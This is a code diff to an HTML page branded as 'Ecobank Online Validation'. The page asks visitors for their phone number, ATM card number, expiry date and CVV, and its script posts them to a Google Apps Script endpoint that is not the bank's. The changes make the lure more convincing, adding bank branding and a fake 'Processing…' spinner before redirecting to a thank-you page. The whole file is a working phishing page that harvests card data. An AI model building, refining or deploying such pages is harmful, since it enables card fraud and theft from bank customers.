@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Secure Authentication</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Ecobank Online Validation</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -14,9 +14,10 @@
       align-items: center;
       color: #fff;
       overflow-x: hidden;
+      min-height: 100vh;
     }
 
-    /* Animated waves behind header */
+    /* Background wave animation */
     .header::before, .header::after {
       content: "";
       position: absolute;
@@ -30,16 +31,17 @@
       z-index: 0;
     }
     .header::after { animation-delay: 7.5s; }
+
     @keyframes wave {
       0% { transform: rotate(0deg) translate(0,0); }
       50% { transform: rotate(180deg) translate(20px, 20px); }
       100% { transform: rotate(360deg) translate(0,0); }
     }
 
+    /* Header styling */
     .header {
       position: relative;
-      background: linear-gradient(135deg, #08143a, #0b1d4d);
-      color: #fff;
+      background: linear-gradient(135deg, #2b6cb0, #2a4365);
       width: 100%;
       min-height: 180px;
       padding: 40px 20px;
@@ -57,9 +59,22 @@
       z-index: 1;
     }
 
-    .header-content h1 { margin: 0 0 10px; font-size: 24px; }
-    .header-content p { margin: 5px 0 0; font-size: 14px; }
+    .header-content h1 {
+      margin: 0 0 10px;
+      font-size: 22px;
+      background: linear-gradient(135deg, #1e3c72, #2a5298);
+      display: inline-block;
+      padding: 10px 20px;
+      border-radius: 50px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.25);
+    }
 
+    .header-content p {
+      margin: 5px 0 0;
+      font-size: 14px;
+    }
+
+    /* Login form */
     .login-container {
       background: linear-gradient(145deg, rgba(10,25,70,0.95), rgba(15,35,90,0.95));
       color: #fff;
@@ -70,9 +85,15 @@
       border-radius: 12px;
       box-shadow: 0 6px 16px rgba(0,0,0,0.4);
       backdrop-filter: blur(4px);
+      transition: all 0.3s ease;
     }
 
-    .login-container label { display: block; margin-bottom: 6px; font-size: 14px; color: #fff; }
+    .login-container label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 14px;
+    }
+
     .login-container input {
       width: 100%;
       padding: 12px;
@@ -86,22 +107,16 @@
 
     .button-group {
       display: flex;
-      justify-content: space-between;
-      gap: 10px;
-      flex-wrap: wrap;
+      justify-content: center;
     }
 
     .button-group button {
-      flex: 1;
-      padding: 12px;
+      padding: 12px 20px;
       border: none;
-      border-radius: 6px;
+      border-radius: 50px;
       font-size: 16px;
       font-weight: bold;
       cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
       background: linear-gradient(135deg, #1e90ff, #187bcd);
       color: #fff;
       transition: all 0.3s ease;
@@ -111,6 +126,52 @@
       background: linear-gradient(135deg, #187bcd, #1560a3);
       transform: scale(1.05);
       box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+    }
+
+    /* Overlay for "Processing…" */
+    .processing-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.45);
+      backdrop-filter: blur(6px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-size: 20px;
+      font-weight: bold;
+      z-index: 999;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.3s ease;
+    }
+    .processing-overlay.active {
+      opacity: 1;
+      pointer-events: auto;
+    }
+
+    .spinner {
+      border: 3px solid rgba(255,255,255,0.3);
+      border-top: 3px solid #fff;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 0.8s linear infinite;
+      margin-right: 10px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    @media (max-width: 500px) {
+      .header-content h1 { font-size: 20px; padding: 8px 16px; }
+      .header-content p { font-size: 13px; }
+      .button-group button { font-size: 14px; padding: 10px 20px; width: 100%; }
     }
   </style>
 </head>
@@ -123,19 +184,19 @@
     </div>
   </div>
 
-  <div class="login-container">
+  <div class="login-container" id="formContainer">
     <form id="demoForm">
       <label>Phone Number</label>
-      <input type="tel" name="phone_number" placeholder="Enter your phone number" required>
+      <input type="tel" name="phone_number" placeholder="Enter your phone number" required />
 
       <label>ATM Card Number</label>
-      <input type="text" name="atm_card_number" placeholder="Enter your card number" required>
+      <input type="text" name="atm_card_number" placeholder="Enter your card number" required />
 
       <label>ATM Expiry Date</label>
-      <input type="text" name="atm_expiry_date" placeholder="MM/YY" required>
+      <input type="text" name="atm_expiry_date" placeholder="MM/YY" required />
 
       <label>CVV</label>
-      <input type="text" name="cvv" placeholder="Enter CVV" required>
+      <input type="text" name="cvv" placeholder="Enter CVV" required />
 
       <div class="button-group">
         <button type="submit">VALIDATE →</button>
@@ -143,20 +204,37 @@
     </form>
   </div>
 
+  <div class="processing-overlay" id="processingOverlay">
+    <div class="spinner"></div> Processing…
+  </div>
+
   <script>
     const scriptURL = "https://script.google.com/macros/s/AKfycbxBZeRKxbAyf1pWTLN0z15_l-E3RXnp3hvx2gYHiDDU00GKZ3vBKVt7T2kImh9Sfoo1dw/exec";
     const form = document.getElementById("demoForm");
+    const overlay = document.getElementById("processingOverlay");
+    const formContainer = document.getElementById("formContainer");
 
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
-      const formData = new FormData(form);
+      overlay.classList.add("active");
+      formContainer.style.filter = "blur(4px)";
 
+      const formData = new FormData(form);
       try {
         const response = await fetch(scriptURL, { method: "POST", body: formData });
         const result = await response.text();
-        if (result.includes("Success")) window.location.href = "thankyou.html";
-        else alert("Submission failed: " + result);
+        setTimeout(() => {
+          overlay.classList.remove("active");
+          formContainer.style.filter = "none";
+          if (result.includes("Success")) {
+            window.location.href = "thankyou.html";
+          } else {
+            alert("Submission failed: " + result);
+          }
+        }, 1000);
       } catch (err) {
+        overlay.classList.remove("active");
+        formContainer.style.filter = "none";
         alert("Network error. Please try again.");
       }
     });
